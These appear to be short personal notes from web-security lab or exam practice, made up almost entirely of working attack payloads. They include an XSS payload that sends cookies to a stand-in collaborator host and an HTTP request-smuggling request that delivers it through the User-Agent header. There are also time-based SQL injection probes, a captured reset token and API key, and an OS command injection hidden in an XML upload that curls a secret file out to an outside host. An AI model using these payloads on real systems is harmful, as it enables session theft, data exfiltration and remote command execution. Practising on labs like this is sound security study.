# Extras  


## 1 - 1  

```
a"/><script>document.location='http://COLABORATOR.com/?abc='+document.cookie;</script>
```

>HTTP request smuggling + XSS + useragent blog comment 

```
POST / HTTP/1.1
Host: TARGET.net
Cookie: _lab=YESYESYESYES; _lab_analytics=YESYESYESYES; session=YESYESYESYES
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: Ceop4Tck
Content-Length: 795
Connection: keep-alive

1a
mug9q=x&find=fuzz2&8p7m4=x
0

GET /post?postId=3 HTTP/1.1
User-Agent: a"/><script>document.location='http://COLLABORATOR.com/?app='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Cookie: _lab=YESYESYESYES; _lab_analytics=YESYESYESYES; session=YESYESYESYES

x=1
```

## 1 - 2  

>SQL advance search  injection - fail  

>***not***

```
GET /search_advanced?find='&sortBy=&writer= HTTP/2
```  

```
GET /search_advanced?find='+--+comment&sortBy=DATE&writer= HTTP/2
```

```
GET /search_advanced?find=';SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END--&sortBy=DATE&writer= HTTP/2
```



## 2 - 1  

>password refresh reset  

```
/refreshpassword?temp-forgot-password-token=DdwYXbFEN8ncNktdx2y0OjAKgzghNVoa
```  

## 2 - 2  

>changeEmail js  

```			   
HTTP/2 302 Found
Location: /myaccount
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 173

{
  "username": "carlos",
  "email": "attacker@exploit-0a8a003603011b95c11d5cda01420001.exploit-server.net",
  "apikey": "ZrObR96W6DppZKNGphkBHWMMAtZBZC5Y",
  "roleid": 47
}
```

## 2 - 3  

>XML + OS Command injection  

```
------WebKitFormBoundary 

Content-Disposition: form-data; name="user-import-file"; filename="exam77.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>Jacky22</username>
        <email>james22@exploit-123.exploit-server.net||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||</email>
    </user>
</users>

------WebKitFormBoundary
```

>solution  

